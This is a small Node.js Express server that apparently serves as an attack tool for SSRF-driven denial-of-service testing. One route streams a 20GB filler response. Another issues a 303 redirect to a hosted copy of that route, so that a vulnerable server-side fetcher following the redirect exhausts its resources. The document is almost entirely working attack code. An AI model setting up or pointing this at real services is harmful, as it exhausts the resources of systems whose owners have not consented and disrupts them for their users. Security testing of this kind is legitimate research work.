const express = require("express");
const app = express();
const PORT = 3000; // Change port if needed

// Route to simulate a large response (potential DoS vector)
app.get("/dos", (req, res) => {
  res.status(200);
  res.setHeader("Content-Type", "text/plain");

  const chunkSize = 1024; // 1KB per chunk
  const totalBytes = 20 * 1024 * 1024 * 1024; // 20GB in bytes
  const iterations = totalBytes / chunkSize;  // number of chunks to send
  const chunk = "A".repeat(chunkSize);          // 1KB chunk
  let counter = 0;

  function sendChunk() {
    if (counter < iterations) {
      // Write one chunk; if the internal buffer is full, wait for 'drain'
      if (!res.write(chunk)) {
        res.once("drain", sendChunk);
      } else {
        counter++;
        // Use setImmediate to avoid blocking the event loop too long
        setImmediate(sendChunk);
      }
    } else {
      res.end();
      console.log("Finished streaming 20GB payload.");
    }
  }

  sendChunk();
  console.log("Started streaming 20GB payload for DoS testing.");
});

// Route to trigger SSRF redirect (for context)
app.get("/ssrf", (req, res) => {
  // Redirect with a 303 status code to the large-response endpoint
  res.status(303).set("Location", `https://ssrf-303.onrender.com/dos`).send();
  console.log("Redirecting to /dos for SSRF/DoS testing...");
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
